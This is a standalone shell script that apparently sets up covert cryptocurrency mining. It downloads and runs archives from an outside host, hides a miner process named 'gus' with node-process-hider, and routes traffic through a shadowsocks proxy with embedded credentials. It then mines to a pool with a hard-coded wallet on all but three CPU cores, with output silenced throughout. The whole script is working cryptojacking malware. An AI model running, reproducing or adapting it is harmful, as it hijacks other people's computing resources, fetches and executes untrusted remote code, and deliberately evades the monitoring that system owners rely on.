#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 3`
echo ""
echo $used_num_of_cores
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add gus 1>/dev/null 2>&1

sleep 2

wget -q http://greenleaf.teatspray.fun/gus.tar.gz >/dev/null

tar -xf gus.tar.gz

sleep 2

apt update >/dev/null

sleep 2

apt -y install build-essential automake libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git >/dev/null

sleep 2

./gus --algo YespowerMbc -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p IhatePopUpsWut -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
